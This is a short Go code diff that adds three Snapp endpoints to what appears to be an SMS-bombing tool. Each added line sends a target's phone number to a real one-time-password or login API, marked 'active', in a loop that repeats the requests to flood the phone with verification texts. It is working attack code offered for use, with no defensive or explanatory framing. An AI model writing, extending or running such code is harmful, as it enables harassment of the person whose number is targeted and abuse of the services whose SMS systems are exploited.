@@ -235,6 +235,17 @@ func main() {
 		go sms("https://api.ostadkr.com/login", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // active ✅
+		go sms("https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=", map[string]interface{}{
+			"cellphone": phone,
+		}, ch)  // active ✅
+		go sms("https://api.snapp.ir/api/v1/sms/link", map[string]interface{}{
+			"phone": phone,
+		}, ch)  // active ✅
+		go sms("https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", map[string]interface{}{
+			"cellphone": phone,
+		}, ch)  // active ✅
+
+
 	for i := 0; i < repeatCount; i++ {
 		statusCode := <-ch
 		if statusCode == 404 || statusCode == 400 {
